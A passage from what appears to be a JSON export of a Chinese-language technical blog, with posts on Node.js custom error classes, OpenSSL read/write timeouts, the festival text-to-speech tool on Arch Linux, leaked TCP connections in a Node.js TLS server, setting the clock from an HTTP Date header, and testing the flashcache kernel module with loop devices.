style=\"color: #999999; font-style: italic;\">\/*<\/span><span style=\"color: #999999; font-style: italic;\">'Error: this is error\\n    at repl:1:11 ...*\/<\/span>\nmyerr.stack <span style=\"color: #999999; font-style: italic;\">\/*<\/span><span style=\"color: #999999; font-style: italic;\">'MyError\\n    at repl:1:21 ...*\/<\/span>\n<\/pre>\n<\/div>\n\n<p>\n\u4fee\u590dnode.js\u4e0bMyError\u7684stack\u4e0d\u6b63\u786e\u7684\u95ee\u9898\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">MyError<\/span>(<span style=\"color: #ffcc66;\">message<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span> Error.captureStackTrace(<span style=\"color: #6699cc;\">this<\/span>, <span style=\"color: #6699cc;\">this<\/span>.constructor)\n<span style=\"background-color: #515151;\"> <\/span> <span style=\"color: #6699cc;\">this<\/span>.message = message || <span style=\"color: #66cccc;\">''<\/span>;\n}\n\nMyError.<span style=\"color: #6699cc;\">prototype<\/span> = <span style=\"color: #99cc99;\">new<\/span> <span style=\"color: #6699cc;\">Error<\/span>();\nMyError.<span style=\"color: #6699cc;\">prototype<\/span>.constructor = MyError;\nMyError.<span style=\"color: #6699cc;\">prototype<\/span>.name = <span style=\"color: #66cccc;\">'MyError'<\/span>;\n<\/pre>\n<\/div>\n\n<p>\n<b>\u6700\u7ec8\u7248\uff1a\u66f4node.js\u5316\u4e00\u4e9b<\/b>\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">MyError<\/span>(<span style=\"color: #ffcc66;\">message<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (!(<span style=\"color: #6699cc;\">this<\/span> <span style=\"color: #99cc99;\">instanceof<\/span> <span style=\"color: #6699cc;\">MyError<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> <span style=\"color: #99cc99;\">new<\/span> <span style=\"color: #6699cc;\">MyError<\/span>(message);\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   Error.captureStackTrace(<span style=\"color: #6699cc;\">this<\/span>, <span style=\"color: #6699cc;\">this<\/span>.constructor)\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #6699cc;\">this<\/span>.message = message || <span style=\"color: #66cccc;\">''<\/span>;\n}\n\nutil.inherits(MyError, Error)\nMyError.<span style=\"color: #6699cc;\">prototype<\/span>.name = <span style=\"color: #66cccc;\">'MyError'<\/span>;\n<\/pre>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u53c2\u8003<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<dl class=\"org-dl\">\n<dt> <a href=\"https:\/\/docs.nodejitsu.com\/articles\/errors\/what-is-the-error-object\">What is the error object?<\/a> <\/dt><dd>\u5bf9Error\u5bf9\u8c61\u7684\u6210\u5458\u6709\u6240\u63d0\u53ca\uff0c\u4f46\u4e0e\u5f53\u524d\u7684node.js\u7248\u672c\u4e0d\u4e00\u81f4\u3002\n<\/dd>\n\n<dt> <a href=\"https:\/\/cnodejs.org\/topic\/52090bc944e76d216af25f6f\">Node.js\u4e0b\u81ea\u5b9a\u4e49\u9519\u8bef\u7c7b\u578b<\/a> <\/dt><dd>\u6559\u4f60\u5982\u4f55\u81ea\u5b9a\u4e49\u9519\u8bef\u7c7b\u578b\u3002\n<\/dd>\n\n<dt> <a href=\"http:\/\/stackoverflow.com\/questions\/10624873\/what-properties-does-nodejs-expresss-error-object-exposes\">What properties does nodejs express's Error object exposes?<\/a> <\/dt><dd>\u8ba8\u8bbaError\u5bf9\u8c61\u76f8\u5173\u5c5e\u6027\n<\/dd>\n\n<dt> <a href=\"https:\/\/developer.mozilla.org\/en-US\/docs\/Web\/JavaScript\/Reference\/Global_Objects\/Error\">MDN &gt; Web technology for developers &gt; JavaScript &gt; JavaScript reference &gt; Standard built-in objects &gt; Error<\/a> <\/dt><dd>Error\u5bf9\u8c61\u53c2\u8003\u6587\u6863\n<\/dd>\n\n<dt> <a href=\"http:\/\/www.ecma-international.org\/ecma-262\/5.1\/#sec-15.11\">Error Objects<\/a> <\/dt><dd>Error\u5bf9\u8c61\u6807\u51c6\u6587\u6863\n<\/dd>\n<\/dl>\n<\/div>\n<\/div>\n"
},
{
  "title": "SSL_read\u53caSSL_write\u652f\u6301\u8d85\u65f6",
  "timestamp": "2015-01-27 14:29:00",
  "tags": [
    "openssl",
    "c"
  ],
  "body": "<p>\n\u539f\u59cb\u7684socket\u7f16\u7a0b\u4e2d <code>read<\/code> \u3001 <code>write<\/code> \u652f\u6301\u8d85\u65f6\u662f\u5f88\u5bb9\u6613\u5b9e\u73b0\u7684\uff0c\u5982\u4f7f\u7528 <code>select<\/code> \u6216\u8005 <code>setsockopt<\/code> \u8bbe\u7f6e\u8bfb\u5199\u8d85\u65f6\u5e76\u5728 <code>read<\/code> \u548c <code>write<\/code> \u51fa\u9519\u540e\u6839\u636e <code>errno<\/code> \u5224\u65ad\u662f\u5426\u4e3a\u8d85\u65f6\u5f15\u8d77\u3002\n<\/p>\n\n<p>\n\u4f46\u662f\u5728 <code>SSL<\/code> \u7f16\u7a0b\u4e2d\u5bf9\u5e95\u5c42socket\u8c03\u7528 <code>select<\/code> \u4ee5\u53ca\u4f7f\u7528 <code>errno<\/code> \u884c\u4e3a\u662f\u672a\u5b9a\u4e49\u7684\u3002\n<\/p>\n\n<p>\n\u4f7f\u7528 <code>setsockopt<\/code> \u5728\u5e95\u5c42\u7684socket\u4e0a\u8bbe\u7f6e\u8bfb\u5199\u540e\uff0c <code>SSL_read<\/code> \u3001 <code>SSL_write<\/code> \u51fa\u9519\u4f1a\u8fd4\u56dessl\u9519\u8bef\u7801 <code>SSL_ERROR_WANT_READ<\/code> \u6216 <code>SSL_ERROR_WANT_WRITE<\/code> \uff0c\n\u4f46\u662f\u88ab\u4fe1\u53f7\u4e2d\u65ad\u6216\u8005\u5e95\u5c42SSL\u9700\u8981\u91cd\u65b0\u63e1\u624b\u4e5f\u4f1a\u5bfc\u81f4 <code>SSL_read<\/code> \u3001 <code>SSL_write<\/code> \u8fd4\u56de\u540c\u6837\u7684ssl\u9519\u8bef\u7801\u3002\n<\/p>\n\n<p>\n\u5982\u679c\u80fd\u591f\u5c06\u4fe1\u53f7\u5c4f\u853d\u6389\uff0c\u5e76\u542f\u7528SSL\u81ea\u52a8\u91cd\u65b0\u63e1\u624b\uff0c\u5c31\u80fd\u591f\u5b9e\u73b0 <code>SSL_read<\/code> \u3001 <code>SSL_write<\/code> \u8d85\u65f6\u68c0\u6d4b\u3002\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u5c4f\u853d\u4fe1\u53f7\n\n<p>\n\u5ffd\u7565\u5e94\u7528\u4ea7\u751f\u7684\u4fe1\u53f7\uff0c\u5982\uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c\">signal(SIGPIPE, SIG_IGN);\nsignal(SIGCHLD, SIG_IGN);\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u5728\u5e95\u5c42socket\u4e0a\u8bbe\u7f6e\u8d85\u65f6\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c\"><span style=\"color: #99cc99;\">struct<\/span> <span style=\"color: #6699cc;\">timeval<\/span> <span style=\"color: #ffcc66;\">tv<\/span>;\ntv.tv_sec  = 10;\ntv.tv_usec = 0;\nsetsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (<span style=\"color: #6699cc;\">char<\/span>*)&amp;tv, <span style=\"color: #99cc99;\">sizeof<\/span>(<span style=\"color: #99cc99;\">struct<\/span> <span style=\"color: #6699cc;\">timeval<\/span>));\nsetsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (<span style=\"color: #6699cc;\">char<\/span>*)&amp;tv, <span style=\"color: #99cc99;\">sizeof<\/span>(<span style=\"color: #99cc99;\">struct<\/span> <span style=\"color: #6699cc;\">timeval<\/span>));\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u542f\u7528\u81ea\u52a8\u91cd\u65b0\u63e1\u624b\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c\">SSL_CTX_set_mode(ctx, SSL_MODE_AUTO_RETRY);\n<\/pre>\n<\/div>\n<\/li>\n\n<li><code>SSL_read<\/code> \u548c <code>SSL_write<\/code> \u5224\u65ad\u662f\u5426\u8d85\u65f6\u51fa\u9519\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c\"><span style=\"color: #6699cc;\">int<\/span> <span style=\"color: #ffcc66;\">readed<\/span> = SSL_read(ssl, data, size);\n<span style=\"color: #99cc99;\">if<\/span> (readed &lt;= 0) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (SSL_get_error(ssl, readed) == SSL_ERROR_WANT_READ) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">timeout<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">error<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   }\n}\n\n<span style=\"color: #6699cc;\">int<\/span> <span style=\"color: #ffcc66;\">writed<\/span> = SSL_write(ssl, data, size);\n<span style=\"color: #99cc99;\">if<\/span> (writed &lt;= 0) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (SSL_get_error(ssl, writed) == SSL_ERROR_WANT_WRITE) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">timeout<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">error<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   }\n}\n<\/pre>\n<\/div>\n<\/li>\n<\/ul>\n"
},
{
  "title": "Archlinux\u5b89\u88c5\u6587\u672c\u8bed\u97f3\u5408\u6210\uff08TTS\uff09",
  "timestamp": "2015-04-15 20:21:00",
  "tags": [
    "archlinux",
    "tts"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u5b89\u88c5 <code>festival<\/code><\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yaourt -S festival festival-english festival-us\n<\/pre>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u6d4b\u8bd5\u8fd0\u884c<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #cc99cc;\">echo<\/span> <span style=\"color: #66cccc;\">\"This is an example. Arch is the best.\"<\/span> | festival --tts\n<\/pre>\n<\/div>\n\n<ul class=\"org-ul\">\n<li>\u4fee\u590d\u9519\u8bef <code>Linux: can't open \/dev\/dsp<\/code>\n<\/li>\n<\/ul>\n\n<p>\n\u53c2\u8003 <a href=\"https:\/\/wiki.archlinux.org\/index.php\/Festival#Can.27t_open_.2Fdev.2Fdsp\">\u8fd9\u91cc<\/a> \u5c06\u4ee5\u4e0b\u5185\u5bb9\u6dfb\u52a0\u5230 <code>~\/.festivalrc<\/code>\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-lisp\">(Parameter.set 'Audio_Method 'Audio_Command)\n(Parameter.set 'Audio_Command <span style=\"color: #66cccc;\">\"aplay -q -c 1 -t raw -f s16 -r $SR $FILE\"<\/span>)\n<\/pre>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u53c2\u8003<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n<a href=\"https:\/\/wiki.archlinux.org\/index.php\/Festival\">https:\/\/wiki.archlinux.org\/index.php\/Festival<\/a>\n<\/p>\n\n<p>\n<a href=\"https:\/\/linuxtoy.org\/archives\/festival_on_ubuntu.html\">https:\/\/linuxtoy.org\/archives\/festival_on_ubuntu.html<\/a><\/p>\n<\/div>\n<\/div>\n"
},
{
  "title": "Node.js\u670d\u52a1\u5668TCP\u6b7b\u8fde\u63a5\u95ee\u9898\u8bca\u65ad",
  "timestamp": "2015-04-16 20:29:00",
  "tags": [
    "node",
    "network"
  ],
  "body": "<p>\n\u6700\u8fd1\u4e00\u6bb5\u65f6\u95f4\uff0c\u7531\u4e8e\u5f00\u53d1\u5de5\u4f5c\u5f00\u59cb\u8ddf\u5d4c\u5165\u5f0f\u76f8\u5173\uff0c\u5f00\u59cb\u9047\u5230\u4e00\u4e2a\u95ee\u9898\uff1aTCP\u6b7b\u8fde\u63a5\u3002\n<\/p>\n\n<p>\nTCP\u6b7b\u8fde\u63a5\u75c7\u72b6\u662f\u8fd9\u6837\u7684\uff1a\u901a\u4fe1\u53cc\u65b9\u4ece\u4e00\u65b9\u7cfb\u7edf\u4e0a\u770b\u5df2\u7ecf\u65ad\u5f00\uff08\u4e0d\u5b58\u5728\uff09\uff0c\u4f46\u662f\u53e6\u4e00\u65b9\u7cfb\u7edf\u4e0a\u770b\u5374\u662f\u8fde\u63a5\u4e2d\uff08ESTABLISHED\u72b6\u6001\uff09\u3002\n<\/p>\n\n<p>\nTCP\u6b7b\u8fde\u63a5\u4e00\u822c\u5728\u4e00\u65b9\uff08\u6216\u4e2d\u95f4\u7ebf\u8def\u4e0a\u7684\u8bbe\u5907\uff09\u65ad\u7535\u3001\u6b7b\u673a\u540e\u51fa\u73b0\uff0c\u6b64\u65f6\u7531\u4e8e\u53e6\u4e00\u65b9\u6536\u4e0d\u5230\u65ad\u5f00\u8fde\u63a5\u7684IP\u62a5\u6587\uff0c\u4f1a\u8ba4\u4e3a\u8fde\u63a5\u4ecd\u7136\u5b58\u5728\uff0c\u65e5\u79ef\u6708\u7d2f\u4f1a\u8017\u5149\u6587\u4ef6\u63cf\u8ff0\u7b26\u7a7a\u95f4\u4ece\u800c\u5bfc\u81f4\u6027\u80fd\u4e0b\u964d\uff0c\u6700\u7ec8\u62d2\u7edd\u670d\u52a1\u3002\n<\/p>\n\n<p>\n\u5bf9\u4ed8\u8fd9\u79cd\u95ee\u9898\uff0c\u4e00\u822c\u9700\u8981\u53cc\u65b9\u90fd\u8fdb\u884c\u8fde\u63a5\u5fc3\u8df3\u68c0\u6d4b\u3002\u6bd4\u5982\uff1a\u8fde\u63a5\u7a7a\u95f2\u4e00\u6bb5\u65f6\u95f4\u540e\u4e00\u65b9\u53d1\u4e00\u4e2a\u5fc3\u8df3\u8bf7\u6c42\uff0c\u53e6\u4e00\u7aef\u56de\u4e2a\u5fc3\u8df3\u54cd\u5e94\uff0c\u5fc3\u8df3\u8bf7\u6c42\u53d1\u9001\u65b9\u4e00\u6bb5\u65f6\u95f4\u540e\u8fd8\u6536\u4e0d\u5230\u54cd\u5e94\u5219\u8ba4\u4e3a\u8fde\u63a5\u5df2\u65ad\u5f00\uff0c\u5fc3\u8df3\u8bf7\u6c42\u63a5\u6536\u65b9\u4e00\u6bb5\u65f6\u95f4\u5185\u6ca1\u6709\u6536\u5230\u5fc3\u8df3\u8bf7\u6c42\u4e5f\u8ba4\u4e3a\u8fde\u63a5\u5df2\u65ad\u5f00\u3002\n<\/p>\n\n<p>\n\u9700\u8981\u6ce8\u610f\u5230\u7684\u662fnode.js\u7684tls\u670d\u52a1\u5668\u7aef\u63e1\u624b\u8d85\u65f6\u5904\u7406\u4e0d\u5f53\u53ef\u80fd\u4f1a\u5bfc\u81f4TCP\u6b7b\u8fde\u63a5\u51fa\u73b0\uff0c\u6709\u95ee\u9898\u7684\u4ee3\u7801\u793a\u4f8b\u5982\u4e0b\uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">options<\/span> = {\n<span style=\"background-color: #515151;\"> <\/span>   key: <span style=\"color: #66cccc;\">\"...\"<\/span>,\n<span style=\"background-color: #515151;\"> <\/span>   cert: <span style=\"color: #66cccc;\">\"...\"<\/span>,\n<span style=\"background-color: #515151;\"> <\/span>   handshakeTimeout: 10*1000,\n<span style=\"background-color: #515151;\"> <\/span>   plain: <span style=\"color: #6699cc;\">true<\/span>,\n<span style=\"background-color: #515151;\"> <\/span>   ssl: <span style=\"color: #6699cc;\">true<\/span>\n};\n\n<span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">tlsServer<\/span> = tls.createServer(options, app).listen(5433, 8192, <span style=\"color: #99cc99;\">function<\/span>(){\n<span style=\"background-color: #515151;\"> <\/span>   logger.log(<span style=\"color: #66cccc;\">'tls server listening on port 5433'<\/span>);\n});\n\ntlsServer.on(<span style=\"color: #66cccc;\">'clientError'<\/span>, <span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">exception<\/span>, <span style=\"color: #ffcc66;\">socket<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   logger.warn(<span style=\"color: #66cccc;\">'tls server client('<\/span> + socket.remoteAddress + <span style=\"color: #66cccc;\">':'<\/span> + socket.remot<span style=\"text-decoration: underline;\">ePort +<\/span><span style=\"color: #66cccc; text-decoration: underline;\">') error('<\/span><span style=\"text-decoration: underline;\"> + exception + <\/span><span style=\"color: #66cccc; text-decoration: underline;\">')'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n});\n<\/pre>\n<\/div>\n\n<p>\n\u4e0a\u9762\u7684\u4ee3\u7801\u901a\u8fc7\u6307\u5b9a <code>handshakeTimeout<\/code> \u4f7f\u7528\u6307\u5b9aSSL\u63e1\u624b\u8d85\u65f6\u65f6\u95f4\uff0c\u4f46\u662f\u5e76\u672a\u5173\u95ed\u5e95\u5c42\u7684TCP\u8fde\u63a5\uff0c\u4ece\u800c\u5bfc\u81f4TCP\u8fde\u63a5\u6cc4\u9732\uff0c\u5728 <code>clientError<\/code> \u4e8b\u4ef6\u5904\u7406\u51fd\u6570\u4e2d\u6dfb\u52a0\u4ee5\u4e0b\u91ca\u653e\u8bed\u53e5\u5373\u53ef\uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\">socket.destroy();\n<\/pre>\n<\/div>\n\n<p>\n\u9664\u4e86\u5e38\u89c1\u7684\u65ad\u7535\u3001\u6b7b\u673a\u5f15\u8d77TCP\u6b7b\u8fde\u63a5\u5916\uff0c\u8fd9\u91cc\u8fd8\u6709\u4e00\u4e2a\u8bba\u575b\u5e16\u5b50\u8bba\u575b\u5176\u5b83\u539f\u56e0\uff1a\u300a<a href=\"http:\/\/serverfault.com\/questions\/504187\/too-many-established-connections-left-open\">Too many established connections left open<\/a>\u300b\u3002\n<\/p>\n\n<p>\n\u53e6\u5916\u8fd8\u6709 linux \u5185\u6838\u7684 tcp keepalive\u673a\u5236\u4f5c\u4e3a\u5fc3\u8df3\u89e3\u51b3\u65b9\u6848\uff1a\u300a<a href=\"http:\/\/machael.blog.51cto.com\/829462\/211989\/\">linux\u4e0b\u4f7f\u7528TCP\u5b58\u6d3b(keepalive)\u5b9a\u65f6\u5668<\/a>\u300b\u3002\n<\/p>\n\n<p>\n\u8c28\u8bb0\uff1a\u9664\u4e86\u4e3b\u52a8\u901a\u8fc7\u8fde\u63a5\u53d1\u9001\u6570\u636e\u5916\uff0c\u5176\u5b83\u60c5\u51b5\u4e0b\u64cd\u4f5c\u7cfb\u7edf\u53ef\u80fd\u4e0d\u4f1a\u544a\u8bc9\u4f60\u8fde\u63a5\u5df2\u7ecf\u5173\u95ed\u4e86\u3002\n<\/p>\n\n<p>\n\u8981\u5f7b\u5e95\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u9664\u4e86\u8981\u907f\u514d\u6cc4\u9732\uff08\u6216\u5fd8\u8bb0\u5173\u95ed\uff09TCP\u8fde\u63a5\u5916\uff0c\u8981\u6709\u5fc3\u8df3\u673a\u5236\uff0c\u8fd8\u9700\u8981\u4ece\u4ee3\u7801\u5c42\u9762\u8fdb\u884c\u9632\u5fa1\u6027\u7f16\u7a0b\uff0c\u5982\uff1a\u5bf9\u4e8e\u8bfb\u5199\u64cd\u4f5c\u8bbe\u7f6e\u8d85\u65f6\u65f6\u95f4\uff0c\u4e00\u65e6\u8d85\u65f6\u4e3b\u52a8\u5173\u95ed\u8fde\u63a5\u3002<\/p>\n"
},
{
  "title": "linux\u4e0b\u901a\u8fc7HTTP\u540c\u6b65\u7cfb\u7edf\u65f6\u95f4",
  "timestamp": "2015-04-21 11:54:00",
  "tags": [
    "linux"
  ],
  "body": "<p>\n\u5728 <code>NTP<\/code> \u88ab\u7981\u7528\u7684\u7f51\u7edc\u73af\u5883\u4e0b\uff0c\u53ef\u4ee5\u901a\u8fc7 <code>HTTP<\/code> \u534f\u8bae\u4ece\u516c\u5f00\u7684\u7f51\u7ad9\uff08\u5982\uff1awww.baidu.com\uff09\u540c\u6b65\u65f6\u95f4\uff0c\u56e0\u4e3aHTTP\u54cd\u5e94\u901a\u5e38\u4f1a\u5e26\u4e00\u4e2aDate\u5b57\u6bb5\uff0c\u8fd9\u662fWEB\u670d\u52a1\u5668\u7684\u7cfb\u7edf\u65f6\u95f4\uff0c\u53ef\u4ee5\u7528\u5b83\u6765\u8bbe\u7f6e\u672c\u673a\u65f6\u95f4\u3002\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo date --rfc-2822 -s <span style=\"color: #66cccc;\">\"`curl -s -i -X HEAD --header \"Connection: close\" http:\/<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\/www.baidu.com | grep -E '^Date: ' | awk -F ': ' '{print $2}'`\"<\/span>\n<\/pre>\n<\/div>\n"
},
{
  "title": "\u5728Archlinux\u4e0a\u4f7f\u7528FlashCache",
  "timestamp": "2015-04-23 20:16:00",
  "tags": [
    "archlinux",
    "flashcache"
  ],
  "body": "<p>\n<a href=\"https:\/\/github.com\/facebook\/flashcache\/\">Flashcache<\/a> \u662f <a href=\"https:\/\/www.facebook.com\">Facebook<\/a> \u7684\u4e00\u4e2a\u5f00\u6e90\u9879\u76ee\uff0c\u901a\u8fc7\u5c06\u56fa\u6001\u786c\u76d8\uff08SSD\uff09\u505a\u4e3a\u673a\u68b0\u786c\u76d8\uff08HDD\uff09\u7684\u7f13\u5b58\u5c42\uff0c\u63d0\u5347\u78c1\u76d8I\/O\u6027\u80fd\u3002\n<\/p>\n\n<p>\n<a href=\"https:\/\/github.com\/facebook\/flashcache\/\">Flashcache<\/a> \u4f4d\u4e8e\u78c1\u76d8\u9a71\u52a8\u5c42\u4e0e\u6587\u4ef6\u7cfb\u7edf\u5c42\u4e4b\u95f4\uff0c\u662f\u4e00\u4e2a <code>linux<\/code> \u5185\u6838\u6a21\u5757\u3002\n<\/p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u7f16\u8bd1\u5b89\u88c5<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n\u7531\u4e8eArchlinux\u603b\u662f\u4f7f\u7528\u6700\u65b0\u7684linux\u5185\u6838\uff0c\u6700\u597d\u4ece\u6700\u65b0\u7684 <a href=\"https:\/\/github.com\/facebook\/flashcache\/\">Flashcache<\/a> \u6e90\u4ee3\u7801\u8fdb\u884c\u7f16\u8bd1\u5b89\u88c5\u3002\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">git clone https:\/\/github.com\/facebook\/flashcache.git\n<span style=\"color: #cc99cc;\">cd<\/span> flashcache\nmake\nsudo make install\n<\/pre>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u6302\u8f7d\u6a21\u5757<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo insmod \/lib\/modules\/<span style=\"color: #cc99cc;\">`uname -r`<\/span>\/extra\/flashcache\/flashcache.ko\n<\/pre>\n<\/div>\n\n<ul class=\"org-ul\">\n<li>\u4fee\u590d\u6302\u8f7d\u9519\u8bef\n\n<blockquote>\n<p>\ninsmod: ERROR: could not insert module \/lib\/modules\/3.19.3-3-ARCH\/extra\/flashcache\/flashcache.ko: Unknown symbol in module\n<\/p>\n<\/blockquote>\n\n<p>\n\u901a\u8fc7 <code>dmesg | grep flashcache<\/code> \u53ef\u4ee5\u770b\u5230\u4ee5\u4e0b\u9519\u8bef\u4fe1\u606f\uff1a\n<\/p>\n\n<blockquote>\n<p>\n[ 2130.514615] flashcache: Unknown symbol dm_put_device (err 0)<br  \/>\n       [ 2130.514654] flashcache: Unknown symbol dm_io_client_create (err 0)<br  \/>\n       [ 2130.514693] flashcache: Unknown symbol dm_kcopyd_client_create (err 0)<br  \/>\n       [ 2130.514738] flashcache: Unknown symbol dm_unregister_target (err 0)<br  \/>\n       [ 2130.514774] flashcache: Unknown symbol dm_io_client_destroy (err 0)<br  \/>\n       [ 2130.514798] flashcache: Unknown symbol dm_kcopyd_copy (err 0)<br  \/>\n       [ 2130.514821] flashcache: Unknown symbol dm_register_target (err 0)<br  \/>\n       [ 2130.514846] flashcache: Unknown symbol dm_kcopyd_client_destroy (err 0)<br  \/>\n       [ 2130.514870] flashcache: Unknown symbol dm_table_get_mode (err 0)<br  \/>\n       [ 2130.514895] flashcache: Unknown symbol dm_io (err 0)<br  \/>\n       [ 2130.514915] flashcache: Unknown symbol dm_get_device (err 0)\n<\/p>\n<\/blockquote>\n\n<p>\n\u5148\u6302\u8f7d <code>dm-mod<\/code> \u6a21\u5757\u518d\u6302\u8f7d <code>flashcache<\/code> \u6a21\u5757\u5373\u53ef\uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo modprobe dm-mod\nsudo insmod \/lib\/modules\/<span style=\"color: #cc99cc;\">`uname -r`<\/span>\/extra\/flashcache\/flashcache.ko\n<\/pre>\n<\/div>\n\n<p>\n\u53c2\u8003\uff1a<a href=\"https:\/\/bbs.archlinux.org\/viewtopic.php?id=30478\">No entry for device-mapper found<\/a>\n<\/p>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u6a21\u62df\u5b9e\u9a8c<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n\u53c2\u8003\uff1a<a href=\"http:\/\/my.oschina.net\/renguijiayi\/blog\/303747\">flashcache\u7684\u5b9e\u73b0\u4e0e\u7528\u6cd5<\/a>\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u521b\u5efaSSD\u6a21\u62df\u8bbe\u5907\n\n<p>\n\u4f7f\u7528\u5185\u5b58\u6587\u4ef6\u6a21\u62df\u5757\u8bbe\u5907\uff081G\uff09\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">dd <span style=\"color: #ffcc66;\">if<\/span>=\/dev\/zero <span style=\"color: #ffcc66;\">of<\/span>=\/dev\/shm\/ssd.img <span style=\"color: #ffcc66;\">bs<\/span>=1024k <span style=\"color: #ffcc66;\">count<\/span>=1024\nsudo losetup \/dev\/loop1 \/dev\/shm\/ssd.img\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u521b\u5efaHDD\u6a21\u62df\u8bbe\u5907\n\n<p>\n\u4f7f\u7528\u666e\u901a\u78c1\u76d8\u6587\u4ef6\u6a21\u62df\u5757\u8bbe\u5907\uff085G\uff09\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo dd <span style=\"color: #ffcc66;\">if<\/span>=\/dev\/zero <span style=\"color: #ffcc66;\">of<\/span>=\/hdd.img <span style=\"color: #ffcc66;\">bs<\/span>=1024k <span style=\"color: #ffcc66;\">count<\/span>=5120\nsudo losetup \/dev\/loop2 \/hdd.img\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u521b\u5efaFlashcache\u6df7\u5408\u8bbe\u5907\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo flashcache_create -p around cachedev \/dev\/loop1 \/dev\/loop2\nsudo mkfs.ext4 \/dev\/mapper\/cachedev\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u6302\u8f7dFlashcache\u6df7\u5408\u8bbe\u5907\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo mkdir \/data\nsudo mount \/dev\/mapper\/cachedev 